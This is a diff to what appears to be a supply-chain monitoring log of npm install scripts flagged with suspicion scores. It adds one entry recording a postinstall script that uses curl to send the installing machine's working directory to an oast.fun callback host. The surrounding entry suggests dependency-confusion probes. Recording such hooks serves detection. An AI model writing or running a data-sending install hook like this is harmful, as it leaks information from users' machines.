@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "rce-pkg-1",
+    "version": "1.1.0",
+    "scriptType": "postinstall",
+    "scriptContent": "curl \"https://smqgsthxokrhexfzhbcuhmgib5gebkdwc.oast.fun?cmd=$(pwd)\"",
+    "previousVersion": "1.0.0",
+    "timestamp": "2026-02-08T16:40:11.412Z",
+    "issuesend": false,
+    "suspicionScore": 8
+  },
+  {
     "packageName": "@skyeng/libs",
     "version": "99.99.93",
     "scriptType": "preinstall",
